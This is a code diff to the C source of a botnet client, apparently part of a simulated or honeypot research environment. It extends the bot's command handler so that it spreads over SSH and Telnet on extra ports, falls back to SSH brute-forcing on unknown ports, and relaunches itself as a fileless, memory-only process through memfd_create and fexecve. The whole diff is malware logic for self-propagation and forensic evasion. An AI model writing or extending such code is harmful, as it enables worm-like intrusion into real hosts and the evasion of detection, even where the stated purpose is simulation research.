@@ -9,6 +9,7 @@
 #include "relay.h"
 #include "plugin.h"
 #include "killswitch.h"
+#include "persist.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -2180,12 +2181,19 @@ int protocol_process_commands(notnet_bot_t *bot) {
                     spread_ok = 0;
                 } else {
                     switch (port) {
-                        case 22:  spread_ok = spread_ssh(bot, host, port); break;
-                        case 23:  spread_ok = spread_telnet(bot, host, port); break;
+                        case 22:
+                        case 2222:  /* Cowrie SSH alt-port in the sim honeypot tier */
+                            spread_ok = spread_ssh(bot, host, port); break;
+                        case 23:
+                        case 2223:  /* Cowrie Telnet alt-port in the sim honeypot tier */
+                            spread_ok = spread_telnet(bot, host, port); break;
                         case 445: spread_ok = spread_smb(bot, host, port); break;
                         case 6379: spread_ok = spread_redis(bot, host, port); break;
                         case 3389: spread_ok = spread_rdp(bot, host, port); break;
-                        default: log_info("CMD: spread unknown port %d", port); break;
+                        default:
+                            /* Unknown port: best-effort SSH brute (most common
+                             * service); the spreader logs the real outcome. */
+                            spread_ok = spread_ssh(bot, host, port); break;
                     }
                 }
                 if (spread_ok == 0) {
@@ -2702,12 +2710,16 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 bot->telnet_enabled = (atoi(value) != 0);
                 applied = 1;
             } else if (strcmp(key, "persist_enabled") == 0) {
-                /* SECURITY FIX (#84): strict 0/1 toggle. Takes effect on
-                 * the next persistence install (e.g. a payload update). */
+                /* SECURITY FIX (#84): strict 0/1 toggle. When set to 0 the bot
+                 * enters RAM-only fileless mode immediately by relaunching via
+                 * memfd_create/fexecve (#150: observable via SIM_EVIDENCE). */
                 int v = atoi(value);
                 if (v == 0 || v == 1) {
                     bot->persist_enabled = (uint8_t)v;
                     applied = 1;
+                    if (v == 0) {
+                        persist_become_fileless(bot);  /* enter fileless now */
+                    }
                 }
             } else if (strcmp(key, "scan_timeout_ms") == 0) {
                 int v = atoi(value);
